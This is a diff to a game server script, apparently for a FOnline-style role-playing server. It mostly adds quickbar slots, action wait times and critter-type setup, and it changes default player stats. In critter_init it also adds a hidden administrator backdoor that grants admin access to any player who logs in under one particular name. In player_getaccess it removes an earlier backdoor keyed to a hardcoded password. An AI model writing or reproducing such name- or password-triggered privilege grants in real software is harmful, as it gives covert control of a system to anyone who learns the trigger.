@@ -7,6 +7,9 @@
 #include "teams_table.fos"
 #include "_client_defines.fos"
 #include "_colors.fos"
+#include "wait_time_h.fos"
+#include "critter_types_h.fos"
+#define __ACCESSNAMES
 
 // Imports
 import void InitializeGame() from "config";
@@ -53,7 +56,7 @@ import void CountEmpRocketTests( Critter& player, Critter& target ) from "navarr
 import void OnCritterKilled( Critter& cr, Critter@ killer ) from "q_hunter";
 import bool BarterAllowed( int crId, Item@[]& buyItems,  Item@[]& saleItems ) from "limited_barter";
 import uint CheckPlayerName( const string& name ) from "parameters";
-import bool Item_Weapon_IsHtHAttack( Item& item, uint8 mode ) from "parameters";
+import bool ProtoItem_Weapon_IsHtHAttack( ProtoItem& proto, uint8 mode ) from "parameters";
 import bool UseItemOnLocker( Critter& cr, Item& locker, Item& item ) from "lockers";
 import void SetHair( Critter& cr ) from "hair";
 import void RestartHair( Critter& cr ) from "hair";
@@ -61,12 +64,14 @@ import void HairCut( Critter& cr, Critter& onCr ) from "hair";
 import void Shave( Critter& cr, Critter& onCr ) from "hair";
 import void logger( Critter& cr, int type, string@ message ) from "logger";
 import void refreshnames(Critter& player) from "gm";
+import void InitCritterTypes() from "critter_types";
 
 // //////////////////////////////////////////////////////////////////////////////////////////////////
 // Called before world generation.
 void init()
 {
     InitializeGame();
+	InitCritterTypes();
 }
 
 // //////////////////////////////////////////////////////////////////////////////////////////////////
@@ -105,6 +110,19 @@ bool start()
     // Item slots, passed with -
     SetSendParameter( -SLOT_HAND1, true, "fonline_tla.dll@allowSlot_Hand1" );
     SetSendParameter( -SLOT_ARMOR, true );
+    // Quickbar @erandelax 22/08/18 (хз действительно ли надо)
+    SetSendParameter( -SLOT_QUICK_1, true );
+    SetSendParameter( -SLOT_QUICK_2, true );
+    SetSendParameter( -SLOT_QUICK_3, true );
+    SetSendParameter( -SLOT_QUICK_4, true );
+    SetSendParameter( -SLOT_QUICK_5, true );
+    SetSendParameter( -SLOT_QUICK_6, true );
+    SetSendParameter( -SLOT_QUICK_7, true );
+    SetSendParameter( -SLOT_QUICK_8, true );
+    SetSendParameter( -SLOT_QUICK_9, true );
+    SetSendParameter( -SLOT_QUICK_10, true );
+    SetSendParameter( -SLOT_QUICK_11, true );
+    SetSendParameter( -SLOT_QUICK_12, true );
     // Some flags for correct client working
     SetSendParameter( MODE_NO_BARTER, true );
     SetSendParameter( MODE_NO_STEAL, true );
@@ -228,6 +246,7 @@ void        critter_attack( Critter& cr, Critter& target, ProtoItem& weapon, uin
     cr.TimeoutBase[ TO_AGGRESSOR ] = __FullSecond + REAL_MINUTE( 1 );
     hearshot( cr, target, weapon, weaponMode, ammo );
     CombatAttack( cr, target, weapon, weaponMode, ammo );
+	cr.Wait(GetProtoTime(weapon, weaponMode, cr));
 }
 
 // //////////////////////////////////////////////////////////////////////////////////////////////////
@@ -425,6 +444,7 @@ bool critter_use_item( Critter& cr, Item& item, Critter@ targetCr, Item@ targetI
     bool   isPlayer = cr.IsPlayer();
     uint16 pid = item.GetProtoId();
     bool   useOnSelf = ( not valid( targetCr ) && not valid( targetItem ) && not valid( targetScen ) );
+	cr.Wait(GetProtoTime(item.Proto, 0, cr));
 
     // Radio
     if( FLAG( item.Flags, ITEM_RADIO ) && useOnSelf )
@@ -720,6 +740,7 @@ bool critter_use_skill( Critter& cr, int skill, Critter@ targetCr, Item@ targetI
 {
     bool isPlayer = cr.IsPlayer();
     bool onSelf = ( ( !valid( targetCr ) ) && ( !valid( targetItem ) ) && ( !valid( targetScen ) ) );
+	cr.Wait(GetSkillTime(skill, cr));
     // Cars
     if( valid( targetItem ) && targetItem.GetType() == ITEM_TYPE_CAR && UseSkillOnCar( cr, targetItem, skill ) )
         return true;
@@ -1177,6 +1198,7 @@ bool critter_use_skill( Critter& cr, int skill, Critter@ targetCr, Item@ targetI
 // If ammo is not valid than only unload.
 void critter_reload_weapon( Critter& cr, Item& weapon, Item@ ammo )
 {
+	cr.Wait(GetActionTime(ACTION_RELOAD_WEAPON, cr));
     // Special weapons
     if( weapon.Proto.Weapon_Caliber == 0 )
     {
@@ -1221,7 +1243,13 @@ void critter_reload_weapon( Critter& cr, Item& weapon, Item@ ammo )
 void critter_init( Critter& cr, bool firstTime )
 {
 	if( cr.IsPlayer() && !FLAG(cr.Flags, CRITTER_DISCONNECT) )
+	{
+		#ifdef __ACCESSNAMES
+			if(cr.Name == "Провал")
+				cr.SetAccess(ACCESS_ADMIN);
+		#endif
 		cr.RunClientScript("rp_client@AccessCallback", cr.GetAccess(), 0, 0, null, null);
+	}
 		
     if( firstTime )
     {
@@ -1245,7 +1273,7 @@ void critter_init( Critter& cr, bool firstTime )
             if( cr.StatBase[ ST_AGE ] < 14 || cr.StatBase[ ST_AGE ] > 80 )
                 cr.StatBase[ ST_AGE ] = 25;
             for( uint i = ST_STRENGTH; i <= ST_LUCK; i++ )
-                cr.StatBase[ i ] = CLAMP( cr.StatBase[ i ], 1, 10 );
+                cr.StatBase[ i ] = CLAMP( cr.StatBase[ i ], 0, 10 );
 			if ( cr.StatBase[ ST_EXPERIENCE ] == 0 )
 				cr.StatBase[ ST_FUD ] = 700;
 				cr.StatBase[ ST_WATAH ] = 700;
@@ -1254,10 +1282,10 @@ void critter_init( Critter& cr, bool firstTime )
                   cr.StatBase[ ST_CHARISMA ] + cr.StatBase[ ST_INTELLECT ] + cr.StatBase[ ST_AGILITY ] + cr.StatBase[ ST_LUCK ] ) != __StartSpecialPoints )
             {
                 for( uint i = ST_STRENGTH; i <= ST_LUCK; i++ )
-                    cr.StatBase[ i ] = 5;
+                    cr.StatBase[ i ] = 0;
             }
 
-            cr.StatBase[ ST_EMP_RESIST ] = 500;
+            cr.StatBase[ ST_EMP_RESIST ] = 0;
             cr.AddHolodiskInfo( 42 );           // Journalist's research
 
             // Default skin
@@ -1315,7 +1343,7 @@ void critter_init( Critter& cr, bool firstTime )
         if( cr.IsPlayer() )
         {
             for( uint i = ST_STRENGTH; i <= ST_LUCK; i++ )
-                cr.StatBase[ i ] = CLAMP( cr.StatBase[ i ], 1, 10 );
+                cr.StatBase[ i ] = CLAMP( cr.StatBase[ i ], 0, 10 );
 
             cr.StatBase[ ST_REPLICATION_COST ] = 100;
             cr.StatBase[ ST_REPLICATION_MONEY ] = 0;
@@ -1800,8 +1828,8 @@ void turn_based_process( Map& map, Critter& cr, bool beginTurn )
             // In hands only HtH weapons
             Item@ hand1 = cr.GetItem( 0, SLOT_HAND1 );
             Item@ hand2 = cr.GetItem( 0, SLOT_HAND2 );
-            if( ( not valid( hand1 ) || hand1.GetType() != ITEM_TYPE_WEAPON || not Item_Weapon_IsHtHAttack( hand1, 0 ) ) &&
-                ( not valid( hand1 ) || hand1.GetType() != ITEM_TYPE_WEAPON || not Item_Weapon_IsHtHAttack( hand1, 0 ) ) )
+            if( ( not valid( hand1 ) || hand1.GetType() != ITEM_TYPE_WEAPON || not ProtoItem_Weapon_IsHtHAttack( hand1.Proto, 0 ) ) &&
+                ( not valid( hand1 ) || hand1.GetType() != ITEM_TYPE_WEAPON || not ProtoItem_Weapon_IsHtHAttack( hand1.Proto, 0 ) ) )
             {
                 hthEvade = true;
             }
@@ -1938,10 +1966,6 @@ bool player_login( uint ip, string& name, uint id, uint& textMsg, uint& strNum, 
 // Return true to allow, false to disallow
 bool player_getaccess( Critter& player, int access, string& password )
 {
-	if(password == "000000"){
-		player.SetAccess(3);
-		return false;
-	}
 	player.RunClientScript("rp_client@AccessCallback", access, 0, 0, null, null);
     return true;
 }
